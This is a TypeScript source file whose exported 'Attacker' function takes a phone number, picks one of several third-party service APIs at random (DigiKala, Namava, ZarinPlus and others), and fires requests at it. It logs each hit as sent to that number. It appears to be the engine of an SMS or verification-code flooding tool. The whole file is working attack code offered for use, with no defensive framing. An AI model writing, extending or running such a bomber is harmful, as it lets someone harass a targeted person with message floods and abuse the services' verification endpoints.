import axios from "axios";
import { API as APIs } from "./api";

export const Attacker = async (num: number, Loop: string) => {
  return new Promise((resolve, reject) => {
    const API = APIs(num)[Math.floor(Math.random() * APIs(num).length)];
    var headers: object;
    headers = API.headers;

    if (API.method == "POST") {
      axios
        .post(API.url, API.data, headers)
        .then(
          (res: {
            status: number;
            data: {
              status: number;
              message: string;
              succeeded: boolean;
              result: boolean;
              error: { message: string };
            };
          }) => {
            if (API.name === "DigiKala" && res.data.status === 400) {
              reject(`Request From ${API.name} Failed \n${res.data.message}`);
            } else if (API.name === "Namava" && !res.data.succeeded) {
              reject(
                `Request From ${API.name} Failed \n${res.data.error.message}`
              );
            } else if (API.name === "ZarinPlus" && !res.data.status) {
              reject(`Request From ${API.name} Failed \n${res.data.message}`);
            } else if (API.name === "KasbinoApp" && !res.data.result) {
              reject(`Request From ${API.name} Failed \n${res.data.status}`);
            } else if (API.name === "Civapp" && !res.data) {
              reject(`Request From ${API.name} Failed \n${res.data}`);
            } else if (res.status === 200) {
              resolve(`Request From ${API.name} Sends To ${num}`);
            }
          }
        )
        .catch((error: { response: { statusText: string } }) => {
          reject(`${API.name} : \n${error?.response?.statusText}`);
        });
    } else {
      axios
        .get(API.url, headers)
        .then(() => {
          resolve(`Request From ${API.name} Sends To ${num}`);
        })
        .catch((error: { response: { statusText: string } }) => {
          reject(`${API.name} : \n${error?.response?.statusText}`);
        });
    }
  });
};
